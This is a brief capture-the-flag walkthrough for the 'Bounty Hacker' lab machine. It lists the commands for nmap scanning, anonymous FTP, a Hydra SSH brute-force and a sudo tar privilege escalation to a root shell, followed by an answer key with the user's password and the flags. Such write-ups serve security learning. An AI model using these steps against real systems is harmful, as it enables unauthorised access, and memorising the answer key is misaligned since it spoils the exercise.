# Bounty Hacker

ip : `10.10.116.234`

nmap scanning 
```
nmap -sV -T5 -A 10.10.116.234 -oN service-scaning.txt
```
login with ftp as anonymous
```
ftp 10.10.116.234
```
bruteforcing ssh with hydra
```
hydra -l lin -P locks.txt 10.10.116.234 ssh -t 4
```

tar is vulnerable as per
```
sudo -l
```

PrivEsc
```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

| Questions | Answers |
|-----------|---------|
| Who wrote the task list? | lin |
| What service can you bruteforce with the text file found? | ssh | 
| What is the users password ? | RedDr4gonSynd1cat3 |
| user.txt | THM{CR1M3_SyNd1C4T3} |
| root.txt | THM{80UN7Y_h4cK3r} |
